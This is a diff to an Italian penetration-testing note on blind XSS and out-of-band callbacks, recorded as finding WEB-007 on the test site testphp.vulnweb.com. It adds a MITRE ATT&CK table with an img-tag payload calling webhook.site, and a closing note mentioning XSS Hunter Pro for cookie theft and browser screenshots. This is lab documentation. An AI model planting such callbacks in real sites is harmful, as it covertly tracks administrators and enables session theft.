@@ -1,5 +1,14 @@
 # Blind XSS / Out-of-Band (OOB) Interaction
 
+> - **Fase:** Web Attack - Blind XSS / Out-of-Band
+> - **Visibilita:** Zero lato attaccante - il payload viene iniettato alla cieca e si attiva solo quando un'altra persona (es. admin) visualizza il dato infetto
+> - **Prerequisiti:** Campo di input che viene poi visualizzato in un contesto diverso (pannello admin, log, email), servizio OOB esterno (webhook.site, XSS Hunter)
+> - **Output:** Callback HTTP verso server attaccante, IP e User-Agent dell'admin, conferma vulnerabilita in area nascosta, finding WEB-007
+
+---
+
+**ID Finding:** `WEB-007` | **Severity:** `Alto` | **CVSS v3.1:** 8.2
+
 ---
 
 ## 1 Concept
@@ -62,3 +71,22 @@ L'attaccante può risalire a:
 - ISP/Organizzazione: Identificazione del fornitore di servizi internet o dell'azienda proprietaria della rete.
 - Geolocalizzazione: Posizione approssimativa della vittima.
 - Contatti Tecnici: In alcuni casi, email e numeri di telefono dei responsabili di rete (utile per attacchi di Social Engineering successivi).
+
+---
+
+## Mappatura MITRE ATT&CK
+
+| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
+| :--- | :--- | :--- | :--- |
+| Initial Access | Exploit Public-Facing Application | `T1190` | Injection del payload OOB (`<img src="https://webhook.site/...">`) nel campo "Address" del profilo utente, che si attiva quando l'admin visualizza il profilo (WEB-007) |
+| Collection | Browser Session Hijacking | `T1185` | Il callback OOB ricevuto su webhook.site rivela il browser e l'IP dell'amministratore, aprendo la strada al targeting specifico (WEB-007) |
+| Reconnaissance | Gather Victim Identity Information | `T1589` | Analisi dei dati OOB ricevuti (IP, User-Agent, Referer) per identificare l'ISP, la geolocalizzazione e il tipo di browser dell'admin (WEB-007) |
+
+---
+
+> **Nota:** Il finding WEB-007 e stato documentato su `testphp.vulnweb.com` usando webhook.site
+> come servizio OOB per ricevere il callback. Il payload usato e HTML Injection (tag img) invece
+> di JavaScript puro, perche il campo aveva limitazioni di lunghezza. Il Referer nel callback
+> confermava l'origine da `testphp.vulnweb.com`. In un engagement reale, XSS Hunter Pro
+> (https://xsshunter.trufflesecurity.com/) fornisce funzionalita OOB piu avanzate incluso
+> il furto dei cookie e screenshot del browser della vittima.
